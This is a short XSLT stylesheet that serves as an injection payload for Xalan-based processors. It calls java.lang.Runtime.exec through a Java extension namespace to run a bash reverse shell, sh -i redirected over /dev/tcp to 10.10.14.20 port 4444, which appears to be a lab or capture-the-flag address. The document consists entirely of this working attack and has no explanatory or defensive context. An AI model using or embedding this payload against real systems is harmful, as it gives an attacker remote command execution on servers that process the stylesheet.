<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    exclude-result-prefixes="rt">

    <xsl:template match="/">
        <xsl:variable name="command">sh -i >&amp; /dev/tcp/10.10.14.20/4444 0>&amp;1</xsl:variable>
        <xsl:value-of select="rt:exec($command)"/>
    </xsl:template>
</xsl:stylesheet>
